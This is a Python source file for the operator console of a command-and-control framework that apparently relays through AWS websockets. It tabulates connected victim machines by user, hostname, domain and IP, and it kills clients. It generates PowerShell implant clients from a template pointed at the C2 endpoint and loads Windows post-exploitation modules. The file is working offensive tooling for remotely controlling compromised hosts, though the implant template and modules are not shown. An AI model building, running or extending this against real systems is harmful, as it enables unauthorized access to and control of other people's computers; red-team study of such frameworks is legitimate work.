import os
import threading
import shlex
from os import listdir
from os.path import isfile, join
from util.autosugest import C2MenuAutoSuggest, get_prompt_completer

from tabulate import tabulate
from prompt_toolkit import prompt
from prompt_toolkit.history import FileHistory
from aws.lambda_util import random_string

POWERSHELL_TEMPLATE = 'templates/client.ps1'

MENU_OPTION_KILL = 'kill'
MENU_OPTION_HELP = 'help'
MENU_OPTION_EXIT = 'exit'
MENU_OPTION_CLEAR = 'clear'
MENU_OPTION_CLIENTS = 'clients'
MENU_OPTION_GENCLIENT = 'genclient'
MENU_OPTION_LOADMODULE = 'loadmodule'
MENU_OPTION_EXECUTE_LOCAL_COMMAND = '!'


class Master:
    c2_manager = None
    environment_name = None
    proxies = []

    def __init__(self, environment_name, c2_manager):
        self.environment_name = environment_name
        self.c2_manager = c2_manager
        threading.Thread(target=self.c2_manager.get_clients, args=()).start()
        self.load_default_modules()

    def generate_client(self, aws_endpoint, client_name):
        with open(POWERSHELL_TEMPLATE, 'r') as template:
            template_ps = template.read()
            template_ps = template_ps.replace('{{AWS_ENDPOINT}}', aws_endpoint)
            template_ps = template_ps.replace('{{CLIENT_NAME}}', client_name)
            return template_ps

    def list_clients(self):
        print('\n[*] Requesting clients')
        clients = self.c2_manager.get_clients()
        if clients is not None:
            print()
            count = 0
            rows = []
            for client in clients:
                rows.append([count, client['userName']['S'], client['hostname']['S'], client['whoami']['S'], client['domain_name']['S'], client['ip']['S'].replace(', ', '\n'), client['connectionId']['S']])
                count += 1
            print(tabulate(rows, headers=['#', 'Name', 'Hostname', 'User', 'Domain', 'IP', 'ClientID']))
            print()

    def list_c2_commands(self):
        print()
        rows = []
        rows.append(['help', '', 'Shows this message and the options of the loaded modules'])
        rows.append(['clients', '', 'Lists the connected clients'])
        rows.append(['loadmodule ', '<module>', 'Loads the selected module in c2'])
        rows.append(['kill ', '<client>', 'Kills the client.'])
        rows.append(['genclient', '<out_file> <client_name>', 'Generates a Powershell client'])
        rows.append(['!', '<command>', 'Executes the command in this computer'])
        rows.append(['clear', '', 'Clears the screen'])
        rows.append(['exit', '', 'Exit'])
        print(tabulate(rows, headers=['Command', 'Parameters', 'Description']))
        print()
        self.list_module_commands()

    def show_c2_menu(self):

        try:
            while True:
                try:
                    user_input = prompt('c2 [{}] > '.format(self.environment_name), history=FileHistory('.c2_master_history'), auto_suggest=get_prompt_completer(self.c2_manager))
                except ValueError:
                    print('\n[-] Invalid command.\n')
                    self.show_c2_menu()
                    break

                user_input_parts = shlex.split(user_input)

                if not user_input_parts:
                    continue

                if user_input_parts[0] == MENU_OPTION_HELP:
                    self.list_c2_commands()

                elif user_input_parts[0] == MENU_OPTION_EXIT:
                    self.exit()

                elif user_input.startswith(MENU_OPTION_EXECUTE_LOCAL_COMMAND):
                    print(os.system(user_input[1:].strip()))
                    continue

                elif user_input_parts[0] == MENU_OPTION_CLEAR:
                    os.system('clear')
                    continue

                elif user_input_parts[0] == MENU_OPTION_KILL and len(user_input_parts) > 1:
                    client_id = user_input.split(' ')[1]
                    self.c2_manager.kill_client(client_id)
                    continue

                elif user_input_parts[0] == MENU_OPTION_GENCLIENT and len(user_input_parts) > 1:
                    output_file = user_input_parts[1]
                    client_name = random_string(10)
                    if len(user_input_parts) > 2:
                        client_name = user_input_parts[2]
                    template_ps = self.generate_client(self.websockets_url, client_name)
                    with open(output_file, 'w') as output:
                        output.write(template_ps)
                    print('\n[+] Generated client with name "{}" in {}'.format(client_name, output_file))

                elif user_input_parts[0] == MENU_OPTION_LOADMODULE and len(user_input_parts) > 1:
                    module_file = user_input_parts[1]
                    try:
                        if self.c2_manager.load_module(module_file):
                            print('[+] Module loaded. Type "help" to see the module options.')
                        else:
                            print('[-] Loaded already loaded.')
                    except SyntaxError:
                        print('[-] Invalid module {}'.format(module_file))

                elif user_input_parts[0] == MENU_OPTION_CLIENTS:
                    self.list_clients()

                else:
                    if not self.execute_module_if_command_match(user_input):
                        print('\n[-] Command "{}" not found.\n'.format(user_input))

        except KeyboardInterrupt:
            try:
                user_input = prompt('[!] Do you want to exit? Y/n: ')
                if user_input.lower() == 'y' or not user_input:
                    self.exit()
                else:
                    return self.show_c2_menu()
            except KeyboardInterrupt:
                self.exit()

    def list_module_commands(self):
        print('\n[+] Module commands:\n')
        rows = []
        for module in self.c2_manager.get_loaded_modules():
            rows.extend(module.get_commands())
        print(tabulate(rows, headers=['Command', 'Parameters', 'Description']), '\n')

    def execute_module_if_command_match(self, user_input):
        command_split = user_input.split(' ')
        command = command_split[0]
        for module in self.c2_manager.get_loaded_modules():
            for module_command in module.get_commands():
                if module_command[0] == command:
                    module.start(user_input)
                    return True

    def load_default_modules(self):
        ROOT_DIR = os.path.dirname(os.path.abspath(__file__))
        modules_path = '{}/../modules/windows'.format(ROOT_DIR)
        files = [join(modules_path, f) for f in listdir(modules_path) if isfile(join(modules_path, f))]
        for file in files:
            self.c2_manager.load_module(file)

    def exit(self):
        self.c2_manager.exit()
        exit()
